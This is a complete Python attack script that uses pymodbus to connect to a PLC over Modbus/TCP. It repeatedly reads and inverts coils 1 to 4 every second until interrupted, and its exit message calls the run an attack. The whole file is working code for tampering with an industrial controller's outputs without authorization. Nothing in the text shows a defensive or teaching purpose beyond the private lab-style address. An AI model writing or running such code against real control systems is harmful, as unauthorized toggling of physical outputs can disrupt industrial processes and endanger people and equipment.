
import time
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException

PLC_HOST     = "192.168.64.1"
PLC_PORT     = 502
PLC_UNIT     = 1
TARGET_COILS = [1, 2, 3, 4]    # coils you wish to flip
INTERVAL     = 1.0             # seconds between toggles

def main():
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    if not client.connect():
        print(f"ERROR: Cannot connect to PLC at {PLC_HOST}:{PLC_PORT}")
        return

    print(f"Connected. Toggling coils {TARGET_COILS} every {INTERVAL}s...")
    try:
        while True:
            for coil in TARGET_COILS:
                try:
                    rr = client.read_coils(address=coil, count=1, slave=PLC_UNIT)
                    if rr.isError() or not rr.bits:
                        print(f"[WARN] Read error at coil {coil}: {rr}")
                        continue
                    current = rr.bits[0]

                    rq = client.write_coil(address=coil, value=not current, slave=PLC_UNIT)
                    if rq.isError():
                        print(f"[WARN] Write error at coil {coil}: {rq}")
                    else:
                        # Use ASCII arrow to avoid encoding issues
                        print(f"[INFO] Toggled coil {coil}: {current} -> {not current}")
                except ModbusIOException as e:
                    print(f"[ERROR] Modbus IO error at coil {coil}: {e}")

                time.sleep(INTERVAL)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        client.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()